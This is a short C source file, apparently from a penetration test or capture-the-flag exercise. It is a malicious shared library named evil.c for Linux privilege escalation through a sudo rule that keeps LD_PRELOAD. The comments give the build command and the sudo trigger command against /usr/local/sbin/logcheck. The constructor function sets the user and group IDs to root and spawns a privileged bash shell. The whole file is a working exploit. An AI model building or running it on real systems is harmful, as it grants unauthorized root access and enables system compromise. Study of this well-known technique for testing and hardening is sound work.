/*
 * evil.c - malicious shared library for the sudo env_keep+=LD_PRELOAD
 * privesc stage. Its constructor runs as soon as the library is loaded
 * into any dynamically-linked process, i.e. before /usr/local/sbin/logcheck
 * itself even executes.
 *
 * Build ON THE TARGET (so libc/glibc versions match):
 *   gcc -shared -fPIC -nostartfiles -o evil.so evil.c
 *
 * Trigger:
 *   sudo LD_PRELOAD=/full/path/to/evil.so /usr/local/sbin/logcheck
 */
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>

void _init() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
